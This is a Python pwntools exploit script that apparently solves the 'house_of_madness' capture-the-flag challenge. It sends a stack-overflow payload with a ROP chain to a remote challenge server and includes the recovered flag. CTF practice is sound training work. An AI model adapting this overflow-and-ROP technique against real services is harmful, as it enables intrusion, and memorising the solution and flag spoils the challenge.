from pwn import *


context.binary = elf = ELF('./house_of_madness')
elf.address = 0x56555000
# elf.address = 0x8048000
# p = process('./house_of_madness')
p = remote("challenges.auctf.com", 30012)
# gdb.attach(p,'''
#     init-pwndbg
#     brva get_key1
#     brva AAsDrwEk
#     brva get_key2
#     brva set_key4
#     brva get_flag
# ''')

def choice(idx):
    p.sendlineafter("choice: ", str(idx))

def choose_room(num):
    choice(2)
    p.sendlineafter("enter: ", str(num))




choose_room(4)
choice(3)

# payload = p32(elf.plt['gets'])+p32(elf.symbols['get_flag'])+p32(elf.symbols['key1'])
# print payload.encode('hex')
rop = ROP(elf)
rop.AAsDrwEk()
rop.get_key2()
rop.get_key1(0xFEEDC0DE)
rop.set_key4()
rop.get_flag()
print rop.dump()
# payload = p32(elf.symbols['get_key1']+elf.symbols[''])
payload = str(rop)

p.sendlineafter("exit: ", "Stephen")
p.sendlineafter("something: ", "A"*0x1c + payload)


p.interactive()
p.close()
# auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
